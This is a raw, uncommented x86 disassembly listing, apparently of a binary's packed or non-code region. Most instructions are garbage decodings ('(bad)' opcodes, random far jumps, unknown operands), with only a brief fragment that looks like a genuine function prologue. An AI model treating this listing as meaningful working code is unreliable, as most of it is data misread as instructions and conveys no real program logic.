  4a4644:	jns    0x4a4654
  4a4646:	and    DWORD PTR [ebp+0x11302bac],edx
  4a464c:	sub    al,0x43
  4a464e:	dec    eax
  4a464f:	or     BYTE PTR gs:[ebp+ebp*1+0x42195238],dh
  4a4657:	sahf   
  4a4658:	adc    ch,BYTE PTR [esi]
  4a465a:	mov    esp,0xe790862f
  4a465f:	adc    BYTE PTR [eax+0x13],al
  4a4662:	xor    al,bl
  4a4664:	in     al,0x39
  4a4666:	test   BYTE PTR [ecx+esi*1+0x5c],dl
  4a466a:	adc    al,0x32
  4a466c:	push   cs
  4a466d:	and    DWORD PTR [ebp-0x7fcc1fdf],edx
  4a4673:	adc    eax,0x790873c8
  4a4678:	xor    al,0x4
  4a467a:	push   ss
  4a467b:	xor    eax,0x432a421c
  4a4680:	mov    BYTE PTR [esi],dh
  4a4682:	sbb    BYTE PTR [edi],dl
  4a4684:	nop
  4a4685:	retf   0xf210
  4a4688:	aaa    
  4a4689:	pushf  
  4a468a:	cmp    BYTE PTR [edx],dh
  4a468c:	test   BYTE PTR [edi+eax*4],bh
  4a468f:	and    BYTE PTR [eax],bl
  4a4691:	cmp    DWORD PTR [eax-0x5bde30df],esi
  4a4697:	cmp    dh,BYTE PTR [ecx+ebx*1]
  4a469a:	cmp    esi,DWORD PTR [ebx+0x8]
  4a469d:	test   eax,0x4c3cb80c
  4a46a2:	sbb    al,BYTE PTR [edx+0x2a]
  4a46a5:	inc    ebx
  4a46a6:	enter  0xd03d,0x3e
  4a46aa:	retf   0xf210
  4a46ad:	sbb    al,0x54
  4a46af:	sbb    edi,DWORD PTR [edi]
  4a46b1:	call   0x90d1833a
  4a46b6:	inc    eax
  4a46b7:	ins    BYTE PTR es:[edi],dx
  4a46b8:	sbb    al,0x41
  4a46ba:	iret   
  4a46bb:	and    DWORD PTR [edx+esi*1+0x1d8442f0],esp
  4a46c2:	inc    ebx
  4a46c3:	or     BYTE PTR [ecx+0xe],bh
  4a46c6:	and    DWORD PTR [eax],ecx
  4a46c8:	push   ds
  4a46c9:	inc    esp
  4a46ca:	sahf   
  4a46cb:	inc    ebx
  4a46cc:	dec    eax
  4a46cd:	mov    WORD PTR gs:[ebp+0x24],es
  4a46d1:	pop    ds
  4a46d2:	inc    esi
  4a46d3:	adc    BYTE PTR [edx+0x19],dl
  4a46d6:	inc    edx
  4a46d7:	test   al,0x47
  4a46d9:	push   esp
  4a46da:	xchg   BYTE PTR [eax+0x48202ce7],dl
  4a46e0:	les    ecx,FWORD PTR [ecx+0x21]
  4a46e3:	in     al,0x39
  4a46e5:	test   BYTE PTR [eax+0x21],cl
  4a46e8:	dec    edx
  4a46e9:	jns    0x4a46f9
  4a46eb:	and    DWORD PTR [ebp+0x22604bcc],edx
  4a46f1:	dec    esp
  4a46f2:	inc    ebx
  4a46f3:	dec    eax
  4a46f4:	gs or  ah,ah
  4a46f7:	dec    ebp
  4a46f8:	push   0x9e421952
  4a46fd:	and    ecx,DWORD PTR [esi-0x4]
  4a4700:	dec    edi
  4a4701:	xchg   DWORD PTR [eax+0x248010e7],edx
  4a4707:	push   eax
  4a4708:	add    al,0x25
  4a470a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a470b:	xor    al,BYTE PTR [esp+edi*1+0xc528851]
  4a4712:	and    edi,ecx
  4a4714:	and    DWORD PTR [esi+eiz*1],ecx
  4a4717:	push   ebx
  4a4718:	nop
  4a4719:	enter  0x873,0xa9
  4a471d:	push   esp
  4a471e:	and    al,0x27
  4a4720:	push   ebp
  4a4721:	sbb    al,0x42
  4a4723:	sub    al,BYTE PTR [ebx-0x58]
  4a4726:	push   esi
  4a4727:	sub    al,0x28
  4a4729:	nop
  4a472a:	retf   0xf210
  4a472d:	push   edi
  4a472e:	mov    esp,0x3c843258
  4a4733:	xchg   DWORD PTR [eax+0x29],eax
  4a4736:	pop    ecx
  4a4737:	les    esp,FWORD PTR [ecx]
  4a4739:	iret   
  4a473a:	and    DWORD PTR [edx+ebx*2+0x735b2a54],esp
  4a4741:	or     BYTE PTR [ecx+0x5c5cd80c],ch
  4a4747:	sub    eax,DWORD PTR [edx+0x2a]
  4a474a:	inc    ebx
  4a474b:	enter  0xec5d,0x5e
  4a474f:	retf   0xf210
  4a4752:	sbb    al,0x70
  4a4754:	sub    al,0x5f
  4a4756:	hlt    
  4a4757:	test   BYTE PTR [edi+eax*4],bh
  4a475a:	nop
  4a475b:	pusha  
  4a475c:	js     0x4a478b
  4a475e:	popa   
  4a475f:	iret   
  4a4760:	and    DWORD PTR [edx+esi*1+0x2e8062fc],esp
  4a4767:	arpl   WORD PTR [eax],cx
  4a4769:	jns    0x4a4779
  4a476b:	and    DWORD PTR [eax],edx
  4a476d:	das    
  4a476e:	fs sahf 
  4a4770:	inc    ebx
  4a4771:	dec    eax
  4a4772:	gs xchg esp,eax
  4a4774:	sbb    BYTE PTR gs:[eax],dh
  4a4777:	data16 adc BYTE PTR [edx+0x19],dl
  4a477b:	inc    edx
  4a477c:	pushf  
  4a477d:	addr16 push esp
  4a477f:	xchg   BYTE PTR [eax+0x683120e7],dl
  4a4785:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a4786:	imul   esp,DWORD PTR [ecx],0x348439e4
  4a478c:	xor    ch,BYTE PTR [edx+0x79]
  4a478f:	push   cs
  4a4790:	and    DWORD PTR [ebp+0x333c6bb8],edx
  4a4796:	ins    BYTE PTR es:[edi],dx
  4a4797:	inc    ebx
  4a4798:	dec    eax
  4a4799:	gs or  ah,cl
  4a479c:	ins    DWORD PTR es:[edi],dx
  4a479d:	push   eax
  4a479e:	push   edx
  4a479f:	sbb    DWORD PTR [edx-0x62],eax
  4a47a2:	xor    al,0x6e
  4a47a4:	aam    0x6f
  4a47a6:	xchg   BYTE PTR [eax+0x356810e7],dl
  4a47ac:	jo     0x4a479a
  4a47ae:	in     al,0x39
  4a47b0:	test   BYTE PTR [ecx+esi*2+0x70],dl
  4a47b4:	ss jb  0x4a47c3
  4a47b7:	and    edi,ecx
  4a47b9:	and    DWORD PTR [edi+esi*1],eax
  4a47bc:	jae    0x4a4746
  4a47be:	enter  0x873,0xa9
  4a47c2:	je     0x4a47d0
  4a47c4:	cmp    BYTE PTR [ebp+0x1c],dh
  4a47c7:	inc    edx
  4a47c8:	sub    al,BYTE PTR [ebx-0x64]
  4a47cb:	jbe    0x4a47ed
  4a47cd:	cmp    DWORD PTR [eax+0x77f210ca],edx
  4a47d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a47d4:	js     0x4a4808
  4a47d6:	test   BYTE PTR [edi+eax*4],bh
  4a47d9:	cmp    BYTE PTR [edx],bh
  4a47db:	jns    0x4a4799
  4a47dd:	and    edi,ecx
  4a47df:	and    DWORD PTR [edx+edi*2+0x737b3b40],esp
  4a47e6:	or     BYTE PTR [ecx+0x547cd00c],ch
  4a47ec:	cmp    al,0x42
  4a47ee:	sub    al,BYTE PTR [ebx-0x38]
  4a47f1:	jge    0x4a47cb
  4a47f3:	jle    0x4a47bf
  4a47f5:	adc    dl,dh
  4a47f7:	sbb    al,0x5c
  4a47f9:	cmp    eax,0x3c84e07f
  4a47fe:	xchg   DWORD PTR [eax-0x7ec19b80],edx
  4a4804:	iret   
  4a4805:	and    DWORD PTR [edx+esi*1+0x3f8082fc],esp
  4a480c:	or     DWORD PTR [eax],0x79
  4a480f:	push   cs
  4a4810:	and    DWORD PTR [eax+eax*2],eax
  4a4813:	test   BYTE PTR [esi-0x6b9ab7bd],bl
  4a4819:	test   DWORD PTR [eax],ebx
  4a481b:	inc    ecx
  4a481c:	xchg   BYTE PTR [eax-0x63bde6af],cl
  4a4822:	xchg   DWORD PTR [edi-0x7995f2fd],ecx
  4a4828:	inc    edx
  4a4829:	mov    BYTE PTR [edi+0x3920e489],dh
  4a482f:	push   0x488b8a3b
  4a4834:	push   cs
  4a4835:	xchg   edx,eax
  4a4836:	or     DWORD PTR [ebp+ecx*4+0x3920e483],0xffffff8e
  4a483e:	(bad)  
  4a483f:	cmp    DWORD PTR [eax+0xe],ecx
  4a4842:	xchg   edx,eax
  4a4843:	nop
  4a4844:	xchg   ecx,eax
  4a4845:	xchg   edx,eax
  4a4846:	xchg   edx,eax
  4a4847:	and    esp,0x20
  4a484a:	xchg   ebx,eax
  4a484b:	xchg   esp,eax
  4a484c:	and    BYTE PTR [ecx],bh
  4a484e:	dec    eax
  4a484f:	push   cs
  4a4850:	xchg   ebp,eax
  4a4851:	xchg   esi,eax
  4a4852:	push   cs
  4a4853:	xchg   edx,eax
  4a4854:	and    esp,0xffffff97
  4a4857:	cwde   
  4a4858:	cdq    
  4a4859:	in     al,0x20
  4a485b:	cmp    DWORD PTR [eax-0x66],ecx
  4a485e:	fwait
  4a485f:	dec    eax
  4a4860:	push   cs
  4a4861:	xchg   edx,eax
  4a4862:	sbb    DWORD PTR [ebp+ebx*4+0x3920e483],0xffffff9e
  4a486a:	lahf   
  4a486b:	cmp    DWORD PTR [eax+0xe],ecx
  4a486e:	xchg   edx,eax
  4a486f:	mov    al,ds:0x8392a2a1
  4a4874:	in     al,0x20
  4a4876:	mov    ds:0x483920a4,eax
  4a487b:	push   cs
  4a487c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a487d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a487e:	push   cs
  4a487f:	xchg   edx,eax
  4a4880:	and    esp,0xffffffa7
  4a4883:	test   al,0xa9
  4a4885:	in     al,0x20
  4a4887:	cmp    DWORD PTR [eax-0x56],ecx
  4a488a:	stos   DWORD PTR es:[edi],eax
  4a488b:	xchg   ebp,eax
  4a488c:	and    DWORD PTR [esi-0x4b54537d],ebp
  4a4892:	lods   eax,DWORD PTR ds:[esi]
  4a4893:	adc    dl,dh
  4a4895:	sbb    al,0x62
  4a4897:	cmp    edi,DWORD PTR [eax]
  4a4899:	inc    ebx
  4a489a:	scas   al,BYTE PTR es:[edi]
  4a489b:	cmp    al,0x87
  4a489d:	nop
  4a489e:	retf   0xafd8
  4a48a1:	pop    esp
  4a48a2:	inc    esp
  4a48a3:	mov    al,0x21
  4a48a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a48a6:	xor    al,BYTE PTR [eax+eiz*8+0x210e79b1]
  4a48ad:	iret   
  4a48ae:	rol    BYTE PTR [ebp-0x4e],0x44
  4a48b2:	inc    esi
  4a48b3:	mov    bl,0x43
  4a48b5:	dec    eax
  4a48b6:	gs or  al,cl
  4a48b9:	mov    ah,0xa8
  4a48bb:	repnz sbb al,0x42
  4a48be:	sahf   
  4a48bf:	inc    edi
  4a48c0:	mov    ch,0x2c
  4a48c2:	dec    eax
  4a48c3:	mov    dh,0x87
  4a48c5:	nop
  4a48c6:	retf   0xb010
  4a48c9:	mov    bh,0x5c
  4a48cb:	dec    ecx
  4a48cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a48cd:	xor    al,BYTE PTR [esp+edi*1+0xeb9e0b8]
  4a48d4:	and    edi,ecx
  4a48d6:	and    DWORD PTR [edx+ecx*2-0x46],esp
  4a48da:	or     al,0x4b
  4a48dc:	dec    eax
  4a48dd:	or     BYTE PTR gs:[ecx-0x45],bh
  4a48e1:	nop
  4a48e2:	mov    esp,0x439f4811
  4a48e7:	adc    al,0x4c
  4a48e9:	mov    ebp,0xfbb0750d
  4a48ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a48ef:	pop    ebp
  4a48f0:	push   0x40
  4a48f2:	mov    esi,0x86a016a
  4a48f7:	push   0x6e046a47
  4a48fc:	dec    DWORD PTR [esi+0x6]
  4a48ff:	(bad)  
  4a4900:	push   ebp
  4a4901:	xchg   edx,eax
  4a4902:	add    esp,0x1c
  4a4905:	push   cs
  4a4906:	pop    es
  4a4907:	fst    DWORD PTR [eax]
  4a4909:	clc    
  4a490a:	mov    ebx,0x808dcf9
  4a490f:	dec    esp
  4a4910:	mov    ecx,0x353709fe
  4a4916:	outs   dx,DWORD PTR ds:[esi]
  4a4917:	push   ecx
  4a4918:	push   ecx
  4a4919:	push   0x80617026
  4a491e:	inc    edx
  4a491f:	fs push edi
  4a4922:	repz pop esi
  4a4924:	icebp  
  4a4925:	push   eax
  4a4926:	mov    DWORD PTR fs:0x7058646a,esp
  4a492d:	add    bh,BYTE PTR [ebx+edx*2]
  4a4930:	push   esi
  4a4931:	push   edi
  4a4932:	mov    DWORD PTR [ebp-0x8],esp
  4a4935:	out    dx,al
  4a4936:	(bad)  
  4a4938:	std    
  4a4939:	mov    DWORD PTR [ebp-0x4],0xa2401170
  4a4940:	adc    esi,ebp
  4a4942:	lea    eax,[ebp-0x40]
  4a4945:	push   eax
  4a4946:	cmp    edi,edi
  4a4948:	(bad)  
  4a4949:	(bad)  
  4a494a:	dec    esp
  4a494c:	and    WORD PTR [ebp-0x14],0x0
  4a4951:	movsx  eax,WORD PTR [ebp-0x14]
  4a4955:	test   eax,eax
  4a4957:	je     0x4a496c
  4a4959:	mov    ax,WORD PTR [ebp+0x8]
  4a495d:	cwd    
  4a495f:	mov    cx,0x100
  4a4963:	idiv   cx
  4a4966:	mov    WORD PTR [ebp-0x18],dx
  4a496a:	jmp    0x4a49eb
  4a496c:	jnp    0x4a4998
  4a496e:	out    dx,eax
  4a496f:	add    ch,bl
  4a4971:	jmp    0x4a49b5
  4a4973:	loopne 0x4a4955
  4a4975:	sub    dl,BYTE PTR [esi]
  4a4977:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a4978:	add    BYTE PTR [ebx+0x7302a47d],al
  4a497e:	lods   eax,DWORD PTR ds:[esi]
  4a497f:	sti    
  4a4980:	mov    ebx,0x9c1206b7
  4a4985:	add    bl,ch
  4a4987:	or     BYTE PTR [edi-0x63ba762e],al
  4a498d:	mov    ecx,DWORD PTR [ebp-0x18]
  4a4990:	adc    eax,0x7bcc0ed8
  4a4995:	sub    cl,bh
  4a4997:	sti    
  4a4998:	add    ecx,DWORD PTR [ebp-0x5c]
  4a499b:	mov    BYTE PTR [ecx],al
  4a499d:	jo     0x4a4973
  4a499f:	(bad)  
  4a49a1:	outs   dx,DWORD PTR ds:[esi]
  4a49a2:	cld    
  4a49a3:	aaa    
  4a49a4:	leave  
  4a49a5:	mov    cl,0x41
  4a49a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a49a8:	nop
  4a49a9:	ja     0x4a4943
  4a49ab:	cwde   
  4a49ac:	jmp    0x4a496d
  4a49ae:	ins    DWORD PTR es:[edi],dx
  4a49af:	in     eax,dx
  4a49b0:	(bad)  
  4a49b1:	sub    eax,DWORD PTR [ebp-0x18]
  4a49b4:	jo     0xc0aa8c6f
  4a49ba:	es xchg esp,eax
  4a49bc:	fild   DWORD PTR [ebx*8+0x45dd8c5d]
  4a49c3:	mov    WORD PTR [esi-0x7c1e00f9],es
  4a49c9:	cmp    eax,0x75000e00
  4a49ce:	or     ah,bl
  4a49d0:	xor    eax,0x11eb7c68
  4a49d5:	js     0x4a4a2b
  4a49d7:	(bad)  
  4a49d8:	out    dx,al
  4a49d9:	mov    ebp,0x1bff0e6c
  4a49de:	sti    
  4a49df:	pusha  
  4a49e0:	fnstsw ax
  4a49e2:	test   al,0xd
  4a49e4:	jne    0x4a4a5f
  4a49e6:	fsubrp st(0),st
  4a49e8:	test   eax,0xd88f973c
  4a49ed:	fsub   DWORD PTR [edx]
  4a49ef:	ror    DWORD PTR [ebx-0x572327fc],0x24
  4a49f6:	lods   al,BYTE PTR ds:[esi]
  4a49f7:	adc    DWORD PTR [eax],esp
  4a49f9:	add    dh,dh
  4a49fb:	sti    
  4a49fc:	xlat   BYTE PTR ds:[ebx]
  4a49fd:	std    
  4a49fe:	retf   
  4a49ff:	lods   al,BYTE PTR ds:[esi]
  4a4a00:	jmp    0x13e4:0x4d8dd08b
  4a4a07:	in     al,0x60
  4a4a09:	fcomp  QWORD PTR [ebx-0x2d7a6998]
  4a4a0f:	jle    0x4a49c8
  4a4a11:	out    dx,eax
  4a4a12:	ins    DWORD PTR es:[edi],dx
  4a4a13:	jmp    0x4a4a1e
  4a4a15:	daa    
  4a4a16:	lock ret 
  4a4a18:	imul   ebp,DWORD PTR [eax+0x6a50a80a],0xbdc3f6d3
  4a4a22:	rcl    al,cl
  4a4a24:	or     dl,BYTE PTR [eax-0x1c]
  4a4a27:	(bad)  
  4a4a28:	lock mov esp,0x5b5e5f0d
  4a4a2e:	leave  
  4a4a2f:	inc    ebp
  4a4a30:	neg    DWORD PTR [edx+0x32e98a2c]
  4a4a36:	dec    eax
  4a4a37:	cmp    eax,0x5ced0ffc
  4a4a3c:	enter  0x2c11,0x88
  4a4a40:	or     al,0xe8
  4a4a42:	push   edi
  4a4a43:	sub    dl,BYTE PTR [edi]
  4a4a45:	ins    BYTE PTR es:[edi],dx
  4a4a46:	jbe    0x4a4a4a
  4a4a48:	and    BYTE PTR [eax+eiz*8],0xa
  4a4a4c:	add    al,ah
  4a4a4e:	add    ecx,DWORD PTR [esi]
  4a4a50:	fadd   st,st(3)
  4a4a52:	fistp  WORD PTR [edi]
  4a4a54:	fadd   QWORD PTR ds:0x5ca53884
  4a4a5a:	fcomp  DWORD PTR ds:0x749e1780
  4a4a60:	or     DWORD PTR [edx-0x3b],edi
  4a4a63:	jbe    0x4a4a26
  4a4a65:	dec    edx
  4a4a66:	(bad)  
  4a4a67:	jmp    0x4a4a6d
  4a4a69:	test   al,0xc4
  4a4a6b:	add    BYTE PTR [ebx+0x3ad8f718],cl
  4a4a71:	sahf   
  4a4a72:	sub    DWORD PTR [esi+0x52cc4560],0xffffffe0
  4a4a79:	imul   edx,DWORD PTR [edx+ecx*8],0x165b05cc
  4a4a80:	je     0x4a4ac1
  4a4a82:	push   ds
  4a4a83:	jl     0x4a4a33
  4a4a85:	and    ebx,DWORD PTR [edx]
  4a4a87:	xchg   esi,eax
  4a4a88:	push   ecx
  4a4a89:	xchg   BYTE PTR [ebx-0x1d],al
  4a4a8c:	pusha  
  4a4a8d:	and    bh,BYTE PTR [eax-0x3d]
  4a4a90:	ret    
  4a4a91:	outs   dx,DWORD PTR ds:[esi]
  4a4a92:	ret    
  4a4a93:	imul   eax,DWORD PTR [eax+0x2e],0xffffffe4
  4a4a97:	mov    BYTE PTR [ecx+0x50],dh
  4a4a9a:	cwde   
  4a4a9b:	mov    esp,?
  4a4a9d:	cmp    BYTE PTR [esp+eax*8-0x1c],ah
  4a4aa1:	sub    eax,0x26cea8e4
  4a4aa6:	mov    ecx,0xa0a8b45c
  4a4aab:	mov    al,ds:0x263a15ea
  4a4ab0:	dec    ebp
  4a4ab1:	mov    DWORD PTR [ebx],0xa8d02c20
  4a4ab7:	jecxz  0x4a4a45
  4a4ab9:	xor    al,0xcd
  4a4abb:	lds    esi,FWORD PTR [eax]
  4a4abd:	les    edi,FWORD PTR [eax-0x5df84f50]
  4a4ac3:	and    DWORD PTR [ebx-0x74f2fe18],edx
  4a4ac9:	icebp  
  4a4aca:	not    esp
  4a4acc:	inc    esp
  4a4acd:	sub    BYTE PTR [esi],dh
  4a4acf:	fsub   QWORD PTR [ebp+0x36]
  4a4ad2:	icebp  
  4a4ad3:	push   0x37c58752
  4a4ad8:	fwait
  4a4ad9:	dec    esp
  4a4ada:	fsubr  QWORD PTR [bx-0x10]
  4a4ade:	scas   eax,DWORD PTR es:[edi]
  4a4adf:	lods   al,BYTE PTR ds:[esi]
  4a4ae0:	jbe    0x4a4b01
  4a4ae2:	inc    esi
  4a4ae3:	jb     0x4a4b2e
  4a4ae5:	lods   al,BYTE PTR ds:[esi]
  4a4ae6:	fadd   QWORD PTR [eax]
  4a4ae8:	sub    esp,0xffffffe6
  4a4aeb:	xchg   edx,eax
  4a4aec:	add    DWORD PTR [edx-0x179f9ae8],ecx
  4a4af2:	out    0xc8,eax
  4a4af4:	mov    ebx,0xf0a8eccb
  4a4af9:	xor    al,0xc
  4a4afb:	hlt    
  4a4afc:	cld    
  4a4afd:	add    DWORD PTR [edx+0x1e0534b7],edi
  4a4b03:	or     al,dl
  4a4b05:	and    al,BYTE PTR [edx]
  4a4b07:	ja     0x4a4b08
  4a4b09:	inc    esi
  4a4b0a:	(bad)  
  4a4b0c:	jmp    0xff4d952c
  4a4b11:	jne    0x4a4b4c
  4a4b13:	push   eax
  4a4b14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a4b15:	or     BYTE PTR [ebx-0x7b],0xd2
  4a4b19:	ds cwde 
  4a4b1b:	xchg   esi,eax
  4a4b1c:	int3   
  4a4b1d:	mov    cr5,ebp
  4a4b20:	scas   al,BYTE PTR es:[edi]
  4a4b21:	enter  0x5a44,0x24
  4a4b25:	jmp    0xd9be:0xce9a1c3f
  4a4b2c:	in     eax,dx
  4a4b2d:	sbb    al,0x3b
  4a4b2f:	dec    eax
  4a4b30:	jg     0xd4f04ea
  4a4b36:	mov    ah,0x63
  4a4b38:	lods   al,BYTE PTR ds:[esi]
  4a4b39:	add    bh,BYTE PTR [edx-0x6a01fc29]
  4a4b3f:	aam    0x68
  4a4b41:	pushf  
  4a4b42:	data16 add ah,cl
  4a4b45:	test   eax,0x2e0cd656
  4a4b4a:	sbb    eax,0xd550c84f
  4a4b4f:	inc    eax
  4a4b50:	int3   
  4a4b51:	fnsave [ebx+eiz*2+0x3368ee91]
  4a4b58:	les    edx,FWORD PTR [ebx-0x40]
  4a4b5b:	pop    ds
  4a4b5c:	or     ebp,ecx
  4a4b5e:	jle    0x4a4b3d
  4a4b60:	bound  ecx,QWORD PTR [ecx]
  4a4b62:	pop    esp
  4a4b63:	adc    al,0x9
  4a4b65:	jbe    0x4a4bc8
  4a4b67:	push   ebp
  4a4b68:	mov    esp,0x96daf0b0
  4a4b6d:	aam    0xa6
  4a4b6f:	mov    esp,0x68e75150
  4a4b74:	sbb    ah,BYTE PTR [eax+0x4c89469]
  4a4b7a:	adc    DWORD PTR [esi+0x14],ebp
  4a4b7d:	mov    dh,0xe7
  4a4b7f:	pusha  
  4a4b80:	jmp    0x598f833
  4a4b85:	jmp    0xa32ac318
  4a4b8a:	push   eax
  4a4b8b:	pop    esp
  4a4b8c:	push   ds
  4a4b8d:	and    BYTE PTR [esi],al
  4a4b8f:	aam    0x41
  4a4b91:	or     dh,BYTE PTR [ecx-0xf]
  4a4b94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a4b95:	loopne 0x4a4bb2
  4a4b97:	mov    DWORD PTR [ecx-0x30],ecx
  4a4b9a:	xor    eax,0x4e083f0
  4a4b9f:	jp     0x4a4ba9
  4a4ba1:	in     eax,0x22
  4a4ba3:	aad    0x42
  4a4ba5:	dec    edi
  4a4ba6:	mov    bl,0x92
  4a4ba8:	fmul   DWORD PTR [ecx+esi*4-0x64]
  4a4bac:	mov    ah,0xe
  4a4bae:	aam    0xd0
  4a4bb0:	xchg   ecx,eax
  4a4bb1:	loopne 0x4a4b7b
  4a4bb3:	lds    esp,FWORD PTR [esi+0xc9aff84]
  4a4bb9:	pushf  
  4a4bba:	int    0x25
  4a4bbc:	add    esi,DWORD PTR [eax-0xc]
  4a4bbf:	clc    
  4a4bc0:	call   0x5ea59308
  4a4bc5:	jno    0x4a4b9f
  4a4bc7:	mov    ds:0x7438c610,al
  4a4bcc:	mov    ds:0x541c029,al
  4a4bd1:	mov    ?,WORD PTR [ebx+0x14]
  4a4bd4:	mov    esp,DWORD PTR [esi+0x75]
  4a4bd7:	das    
  4a4bd8:	sub    eax,0xf0c12be
  4a4bdd:	test   BYTE PTR [ebx+0x1],dh
  4a4be0:	jg     0x4a4bba
  4a4be2:	mov    ecx,eax
  4a4be4:	or     eax,0xd679b774
  4a4be9:	ds in  al,dx
  4a4beb:	mov    WORD PTR [esi-0x7e],fs
  4a4bee:	nop
  4a4bef:	xor    cl,BYTE PTR [edx]
  4a4bf1:	fsub   st(3),st
  4a4bf3:	adc    bl,BYTE PTR [edi+ecx*8+0x6c]
  4a4bf7:	sub    al,BYTE PTR [edx+eax*2-0x72]
  4a4bfb:	nop
  4a4bfc:	cmc    
  4a4bfd:	add    bh,BYTE PTR [esi]
  4a4bff:	fmul   QWORD PTR [ebx+0x2378a9ae]
  4a4c05:	xchg   esp,eax
  4a4c06:	mov    WORD PTR [edx],?
  4a4c08:	xor    BYTE PTR [eax+0x75],0xdc
  4a4c0c:	pop    esi
  4a4c0d:	in     al,dx
  4a4c0e:	clc    
  4a4c0f:	popa   
  4a4c10:	mov    DWORD PTR [ebx],edi
  4a4c12:	lock jne 0xc4f951bd
  4a4c19:	push   0x565229c0
  4a4c1e:	fadd   DWORD PTR [eax+0x8]
  4a4c21:	icebp  
  4a4c22:	xor    al,0xfc
  4a4c24:	and    al,0x2a
  4a4c26:	mov    edi,0xa42e016a
  4a4c2b:	mov    ah,0x4d
  4a4c2d:	pop    edx
  4a4c2e:	or     al,0x7b
  4a4c30:	and    DWORD PTR [eax-0x1fcc85ef],eax
  4a4c36:	(bad)  
  4a4c37:	call   0x6f02:0x53249f0e
  4a4c3e:	xchg   BYTE PTR [esp+eax*8],cl
  4a4c41:	in     al,0x4
  4a4c43:	mul    BYTE PTR [eax+0x39]
  4a4c46:	mov    ah,al
  4a4c48:	and    esp,0xe0d40595
  4a4c4e:	ret    0x523
  4a4c51:	ss pop ecx
  4a4c53:	call   0x6e9b0912
  4a4c58:	inc    ecx
  4a4c59:	sbb    al,BYTE PTR [edx-0x11]
  4a4c5c:	add    al,0xe4
  4a4c5e:	das    
  4a4c5f:	in     al,0x2c
  4a4c61:	adc    al,0x7c
  4a4c63:	pop    eax
  4a4c64:	or     al,0x79
  4a4c66:	ja     0x4a4caf
  4a4c68:	fcom   DWORD PTR [edi+0x2d]
  4a4c6b:	in     al,dx
  4a4c6c:	sbb    BYTE PTR ds:0x4dbe13f0,dl
  4a4c72:	cmp    al,cl
  4a4c74:	sti    
  4a4c75:	mov    ah,0x1f
  4a4c77:	mov    ah,0x1
  4a4c79:	mov    esi,0x2bc9d3f9
  4a4c7e:	rcl    DWORD PTR [esi+ebp*8],0x2b
  4a4c82:	lock push cs
  4a4c84:	inc    ebp
  4a4c85:	or     ch,BYTE PTR [esi+0x4f]
  4a4c88:	out    0x56,al
  4a4c8a:	push   ebx
  4a4c8b:	push   0x6e8c075
  4a4c90:	add    al,0x4b
  4a4c92:	les    esp,FWORD PTR [ecx-0xd]
  4a4c95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a4c96:	adc    eax,0x2c28a41f
  4a4c9b:	fsubr  st,st(1)
  4a4c9d:	adc    edi,DWORD PTR [eax+edx*2+0x21]
  4a4ca1:	and    al,0xcf
  4a4ca3:	add    DWORD PTR [edx],esi
  4a4ca5:	das    
  4a4ca6:	test   BYTE PTR [eax+0x73640e6b],cl
  4a4cac:	mov    BYTE PTR [ecx+eax*1-0x7c],ah
  4a4cb0:	(bad)  [eax]
  4a4cb2:	dec    esp
  4a4cb3:	adc    DWORD PTR [esi+esi*1+0x4e],ebp
  4a4cb7:	cmp    DWORD PTR [ebp+0x75],0x4a
  4a4cbb:	mov    edi,0x16289c50
  4a4cc0:	adc    DWORD PTR [ecx-0x3d],ebp
  4a4cc3:	jne    0x4a4cf4
  4a4cc5:	adc    eax,0xeb34e443
  4a4cca:	jecxz  0x4a4ccc
  4a4ccc:	rol    DWORD PTR [edi+eiz*1],1
  4a4ccf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a4cd0:	in     al,0x7b
  4a4cd2:	or     BYTE PTR [esi+0x9],ah
  4a4cd5:	mov    edx,0x9550bac3
  4a4cda:	aaa    
  4a4cdb:	repz jo 0x4a4d4b
  4a4cde:	jmp    0x4a4cee
  4a4ce0:	pop    esp
  4a4ce1:	jge    0x4a4cf0
  4a4ce3:	cmp    ebx,DWORD PTR [esi+0x6899ff2d]
  4a4ce9:	cdq    
  4a4cea:	mov    WORD PTR [edx],ds
  4a4cec:	and    eax,0xd21a6c74
  4a4cf1:	cld    
  4a4cf2:	mov    ch,0x9b
  4a4cf4:	in     al,0xe4
  4a4cf6:	in     al,0x69
  4a4cf8:	cli    
  4a4cf9:	in     al,0xe0
  4a4cfb:	fmul   DWORD PTR [eax]
  4a4cfd:	pop    es
  4a4cfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a4cff:	sbb    esp,edx
  4a4d01:	in     al,dx
  4a4d02:	or     al,0x0
  4a4d04:	add    DWORD PTR [ebx],0x77
  4a4d07:	mov    al,ds:0x8d8b8fb
  4a4d0c:	popf   
  4a4d0d:	fnstsw WORD PTR [edx*1-0x57b7ff48]
  4a4d14:	mov    esp,0xd2330cbc
  4a4d19:	push   ebx
  4a4d1a:	jns    0x4a4d73
  4a4d1c:	mov    al,ds:0xf2a7b4be
  4a4d21:	xor    al,0xc0
  4a4d23:	sar    BYTE PTR [ebp-0x50],0x1b
  4a4d27:	ficomp DWORD PTR [esi]
  4a4d29:	push   ss
  4a4d2a:	test   BYTE PTR [eax*4+0x3b00ff7c],dh
  4a4d31:	xchg   ebp,eax
  4a4d32:	lock jne 0x4a4d5f
  4a4d35:	int    0x13
  4a4d37:	pop    eax
  4a4d38:	int3   
  4a4d39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a4d3a:	jmp    0x8f9f:0x2e4e4594
  4a4d41:	mov    WORD PTR [esp+edi*8+0x366098ed],cs
  4a4d48:	loop   0x4a4d06
  4a4d4a:	add    edx,DWORD PTR [edi+0x5c209a0c]
  4a4d50:	out    dx,al
  4a4d51:	push   ss
  4a4d52:	cmp    BYTE PTR ds:0x17a58307,al
  4a4d58:	push   ss
